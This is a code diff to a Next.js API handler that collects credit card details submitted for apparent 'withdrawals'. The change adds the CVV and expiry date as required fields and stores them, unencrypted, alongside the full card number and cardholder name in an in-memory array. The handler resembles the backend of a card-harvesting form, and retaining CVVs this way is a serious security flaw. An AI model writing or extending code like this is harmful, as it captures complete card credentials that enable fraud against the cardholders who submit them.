@@ -4,6 +4,8 @@ import { NextApiRequest, NextApiResponse } from "next";
 const creditCardDetailsStore: Array<{
   creditCardNumber: string;
   cardholderName: string;
+  cvv: string;
+  expiryDate: string;
   withdrawAmount: string;
   withdrawCurrency: string;
   timestamp: string;
@@ -11,15 +13,17 @@ const creditCardDetailsStore: Array<{
 
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
   if (req.method === "POST") {
-    const { creditCardNumber, cardholderName, withdrawAmount, withdrawCurrency } = req.body;
+    const { creditCardNumber, cardholderName, cvv, expiryDate, withdrawAmount, withdrawCurrency } = req.body;
 
-    if (!creditCardNumber || !cardholderName || !withdrawAmount || !withdrawCurrency) {
+    if (!creditCardNumber || !cardholderName || !cvv || !expiryDate || !withdrawAmount || !withdrawCurrency) {
       return res.status(400).json({ error: "Missing required fields" });
     }
 
     const data = {
       creditCardNumber,
       cardholderName,
+      cvv,
+      expiryDate,
       withdrawAmount,
       withdrawCurrency,
       timestamp: new Date().toISOString(),
